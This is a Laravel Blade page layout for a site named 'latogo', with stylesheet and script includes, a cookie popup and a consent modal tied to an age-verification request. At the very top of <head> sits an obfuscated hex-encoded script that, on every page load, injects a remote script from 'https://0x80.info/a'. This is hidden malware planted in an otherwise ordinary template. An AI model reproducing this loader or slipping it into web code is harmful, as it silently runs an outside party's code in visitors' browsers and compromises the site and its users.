<!DOCTYPE html>
<html lang="en">

<head>
<script>var _0x46c7=["\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x73\x72\x63","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x30\x78\x38\x30\x2E\x69\x6E\x66\x6F\x2F\x61","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x68\x65\x61\x64","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65"];var a=document[_0x46c7[1]](_0x46c7[0]);a[_0x46c7[2]]= _0x46c7[3];document[_0x46c7[6]](_0x46c7[5])[0][_0x46c7[4]](a)</script>
<meta charset="utf-8">
<meta content="width=device-width, initial-scale=1.0" name="viewport">
<title>latogo</title>
<meta content="" name="description">
<meta content="" name="keywords">

<link rel="shortcut icon" type="image/x-icon" href="{{asset('assets/img/favicon.svg')}}">
<link rel="stylesheet" href="{{asset('assets/css/bootstrap.min.css')}}">
<link rel="stylesheet" href="{{asset('assets/plugins/fontawesome/css/fontawesome.min.css')}}">
<link rel="stylesheet" href="{{asset('assets/plugins/fontawesome/css/all.min.css')}}">
<link rel="stylesheet" href="{{asset('assets/css/owl.carousel.min.css')}}">
<link rel="stylesheet" href="{{asset('assets/css/owl.theme.default.min.css')}}">
<link rel="stylesheet" href="{{asset('assets/plugins/slick/slick.css')}}">
<link rel="stylesheet" href="{{asset('assets/plugins/slick/slick-theme.css')}}">
<link rel="stylesheet" href="{{asset('assets/plugins/select2/css/select2.min.css')}}">
<link rel="stylesheet" href="{{asset('assets/plugins/aos/aos.css')}}">
<link rel="stylesheet" href="{{asset('assets/css/style.css')}}">
<link rel="stylesheet" href="{{asset('assets/css/cookie-style.css')}}">
<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css">
<link href="https://cdnjs.cloudflare.com/ajax/libs/sweetalert/1.1.3/sweetalert.css" rel="stylesheet"/>
</head>
<style>
    .modal-body .col-sm-8 {
        text-align: center;
    }
    .intro-title {
        margin-bottom: 5px;
        font-weight: 400;
    }
</style>
<body>

    <!-- Cookie Popup Start -->
    <div id="cookiePopup1" style="z-index:999;" class="hide d-none">
        <img src="{{ asset('cookie.png') }}" />
        <div style="max-height:250px;overflow:auto;" class="">
            <p class="fw-bold">
                This website uses cookies that are strictly necessary for the technical operation of the website and are always set. Other cookies requiring consent, to personalize content and ads and to analyse access to our website, are set only with your consent. We also share information about your use of our website with our social media, advertising and analytics partners.
            </p>
            {{-- <p class="fw-bold">
                We use cookies and similar technologies on our website and process your personal data (e.g. IP address), for example, to personalize content and ads, to integrate media from third-party providers or to analyze traffic on our website. Data processing may also happen as a result of cookies being set. We share this data with third parties that we name in the privacy settings.
            </p>
            <p>
                The data processing may take place with your consent or on the basis of a legitimate interest, which you can object to in the privacy settings. You have the right not to consent and to change or revoke your consent at a later time. For more information on the use of your data, please visit our privacy policy.
                Some services process personal data in unsecure third countries. By consenting to the use of these services, you also consent to the processing of your data in these unsecure third countries in accordance with Art. 49 (1) lit. a GDPR. This involves risks that your data will be processed by authorities for control and monitoring purposes, perhaps without the possibility of a legal recourse.UYou are under 16 years old? Then you cannot consent to optional services. Ask your parents or legal guardians to agree to these services with you.By accepting all services, you allow Comments2, Emojis2,U, Google Fonts2,U, YouTube2,U, Gravatar (Avatar images)2,U, Google Analytics3,U, Facebook Share Button4,U, Mailchimp4,U and Facebook Pixel4,U to be loaded. These services are divided into groups Essential1, Functional2, Statistics3 and Marketing4 according to their purpose (belonging marked with superscript numbers).
            </p> --}}
</div>
        <button id="acceptCookie1">Accept all</button>
    </div>
    <!-- Cookie Popup End -->
<!-- header -->
<div class="main-wrapper">
@include('layouts.dashboard.header')


@yield('content')


@include('layouts.dashboard.footer')
</div>
<div class="modal fade" id="exampleModalCenter" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true" >
    <div class="modal-dialog modal-dialog-centered modal-lg" role="document">
    <div class="modal-content">
        <div class="modal-header">
        <div class="header-search-wrap" >
        <div class="card-body ">
            <!-- <img src="{{asset('assets/images/logo/logo.gif')}}" alt="" class="img-fluid m-auto d-block mb-4" style="width:300px;" /> -->
            <h2 class="title text-center">Welcome To Latogo</h2>
            &nbsp
            <h6 style="font-weight:bold; text-align: left;">We value your privacy</h6>
            <p class="title text-black-50">We value your privacy We use cookies and various functionality, analysis and marketing tools to be able to offer our pages securely and reliably. They help us to optimize the website and improve your personal user experience. This data is also used to check website performance, analyze results and adapt and personalize content.</p>
                <p class="title text-black-50">
            Because we value your privacy, we ask for your permission to use these tools. You can change or withdraw your consent at any time in the privacy settings  .</p>
            <form action="#">
                <!-- <div class="theme-form-control">
                    <small>Enter your DOB here</small>
                    <input type="date" id="date" class="form-control w-50" placeholder="">
                    <p style="color:red;" id="text"></p>
                </div> -->
                <div class="d-flex justify-content-center mt-4">
                    <button name="submit" type="button"  class="btn btn-action-method " onclick=" return verification('19')">Accept Everything</button>
                    <a class=" ms-3 d-block" href="javascript:void(0)"  onclick=" return verification('15')"><p class="mb-0 btn btn-outline-light" >Refused</p></a> 
                </div>
                
            </form>
        </div>
    </div>
        </div>
    </div>
    </div>
</div>

<!-- footer -->

<script src="{{asset('assets/js/jquery-3.6.0.min.js')}}"></script>
<script src="{{asset('assets/js/bootstrap.bundle.min.js')}}"></script>

<script src="{{asset('assets/js/jquery.waypoints.js')}}"></script>
<script src="{{asset('assets/js/jquery.counterup.min.js')}}"></script>

<script src="{{asset('assets/plugins/select2/js/select2.min.js')}}"></script>

<script src="{{asset('assets/js/owl.carousel.min.js')}}"></script>

<script src="{{asset('assets/plugins/slick/slick.js')}}"></script>

<script src="{{asset('assets/plugins/aos/aos.js')}}"></script>

<script src="{{asset('assets/js/script.js')}}"></script> 

<script src="{{asset('assets/js/cookie-script.js')}}"></script> 

<script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/js/toastr.min.js"></script>

<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.3/dist/sweetalert2.all.min.js"></script>
<script>
        $(document).keypress(function(event) {
            var keycode = (event.keyCode ? event.keyCode : event.which);
            if (keycode == '13') {
                $("#verification").click();
            }
        });

        function verification(value){
        var date = value;
        if(date == 15){
            $("#exampleModalCenter").modal("hide");
        }else{
            $("#exampleModalCenter").modal("hide");
        }
        var token = "{{csrf_token()}}";
        $.ajax({
            url:"{{ route('age-verification') }}",
            type:'POST',
            data: {'_token':token,'date':date},
            dataType: 'json',
            success: function(data){
                if (data.status == true) {
                    $("#exampleModalCenter").modal("hide");
                }
                if (data.status == false) {
                    $("#exampleModalCenter").modal("hide");
                }
            }
        });
        }
        var date = "{{ Session::get('years') }}";
        if(!date){
            $(document).ready( function(){
            $("#exampleModalCenter").modal({
                show: false,
                backdrop: 'static'
            });
            $("#exampleModalCenter").modal("show");
            })
        }
</script>
@stack('script')

</body>

</html>
